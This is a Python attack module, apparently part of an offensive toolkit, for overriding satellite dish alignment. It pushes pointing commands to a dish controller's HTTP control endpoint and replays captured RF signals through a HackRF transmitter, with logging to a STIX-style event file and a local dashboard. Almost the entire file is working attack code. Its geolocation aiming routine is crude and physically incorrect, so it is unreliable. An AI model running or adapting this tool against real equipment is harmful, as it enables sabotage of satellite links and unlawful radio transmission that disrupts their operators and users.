#!/usr/bin/env python3
# Path: modules/attacks/satellite_dish_aim_override.py
# Description: Override satellite dish alignment via IP-based control or RF replay. Includes geolocation logic, dashboard sync, and STIX export.

import argparse
import subprocess
import time
import os
import json
import hashlib
import requests
from datetime import datetime
from pathlib import Path
from math import atan2, degrees

# Configuration
LOG_DIR = "logs/attacks"
STIX_FILE = "results/stix_events.json"
WS_ENDPOINT = "ws://localhost:8765"
Path(LOG_DIR).mkdir(parents=True, exist_ok=True)

def utc():
    return datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def log_event(event_type, message, metadata=None):
    event = {
        "timestamp": utc(),
        "type": event_type,
        "message": message,
        "metadata": metadata or {}
    }
    # Save to STIX-compatible log
    with open(STIX_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

    # Also to log file
    log_path = Path(LOG_DIR) / "sat_dish_override.log"
    with open(log_path, "a") as f:
        f.write(f"[{event['timestamp']}] {event_type.upper()}: {message}\n")

    # Attempt to stream to dashboard
    try:
        import websocket
        ws = websocket.create_connection(WS_ENDPOINT, timeout=3)
        ws.send(json.dumps(event))
        ws.close()
    except:
        pass

def calculate_az_el(lat1, lon1, lat2, lon2):
    """Very simplified direction calculation based on long/lat difference."""
    dlon = lon2 - lon1
    azimuth = (degrees(atan2(dlon, lat2 - lat1)) + 360) % 360
    elevation = 45  # Stub: could add real elevation model here
    return int(azimuth), int(elevation)

def send_ip_override(target_ip, azimuth, elevation, auth=None):
    log_event("command", f"Sending IP override to {target_ip} [Az={azimuth}, El={elevation}]")
    payload = {"az": azimuth, "el": elevation}
    headers = {"Content-Type": "application/json"}
    try:
        url = f"http://{target_ip}/api/control/point"
        r = requests.post(url, json=payload, headers=headers, auth=auth, timeout=5)
        if r.status_code == 200:
            log_event("success", f"IP override accepted by controller {target_ip}")
            print("[+] Controller accepted the override.")
        else:
            log_event("error", f"Controller error {r.status_code}: {r.text}")
            print(f"[!] Controller returned status {r.status_code}: {r.text}")
    except requests.RequestException as e:
        log_event("error", f"Failed to reach controller: {e}")
        print(f"[!] Failed to reach controller: {e}")

def replay_rf_signal(signal_file, frequency):
    log_event("command", f"Replaying RF signal {signal_file} at {frequency} Hz")
    cmd = [
        "hackrf_transfer",
        "-t", signal_file,
        "-f", str(frequency),
        "-x", "40",
        "-s", "2000000",
        "-a", "1"
    ]
    try:
        subprocess.run(cmd, check=True)
        log_event("success", f"RF signal {signal_file} replayed on {frequency} Hz")
    except subprocess.CalledProcessError as e:
        log_event("error", f"RF replay failed: {e}")
        print(f"[!] RF replay failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Override satellite dish aim via IP or RF (with geolocation and dashboard integration).")
    parser.add_argument("--mode", choices=["ip", "rf", "geo"], required=True, help="Override mode: ip, rf, or geo")

    # IP override args
    parser.add_argument("--target-ip", help="Dish controller IP")
    parser.add_argument("--azimuth", type=int, help="Azimuth angle (0-360)")
    parser.add_argument("--elevation", type=int, help="Elevation angle (0-90)")
    parser.add_argument("--auth-user", help="Username for basic auth")
    parser.add_argument("--auth-pass", help="Password for basic auth")

    # RF override args
    parser.add_argument("--signal-file", help="IQ file to replay")
    parser.add_argument("--frequency", type=int, help="Replay frequency in Hz")

    # GEO override args
    parser.add_argument("--my-lat", type=float, help="Your current latitude")
    parser.add_argument("--my-lon", type=float, help="Your current longitude")
    parser.add_argument("--target-lat", type=float, help="Target satellite latitude")
    parser.add_argument("--target-lon", type=float, help="Target satellite longitude")

    args = parser.parse_args()

    if args.mode == "ip":
        if not all([args.target_ip, args.azimuth is not None, args.elevation is not None]):
            print("[!] Missing arguments for IP mode.")
            return
        auth = (args.auth_user, args.auth_pass) if args.auth_user and args.auth_pass else None
        send_ip_override(args.target_ip, args.azimuth, args.elevation, auth)

    elif args.mode == "rf":
        if not args.signal_file or not args.frequency:
            print("[!] RF mode requires --signal-file and --frequency.")
            return
        replay_rf_signal(args.signal_file, args.frequency)

    elif args.mode == "geo":
        if not all([args.my_lat, args.my_lon, args.target_lat, args.target_lon, args.target_ip]):
            print("[!] GEO mode requires coordinates and --target-ip.")
            return
        az, el = calculate_az_el(args.my_lat, args.my_lon, args.target_lat, args.target_lon)
        print(f"[+] Calculated Azimuth: {az}, Elevation: {el}")
        send_ip_override(args.target_ip, az, el)

if __name__ == "__main__":
    main()
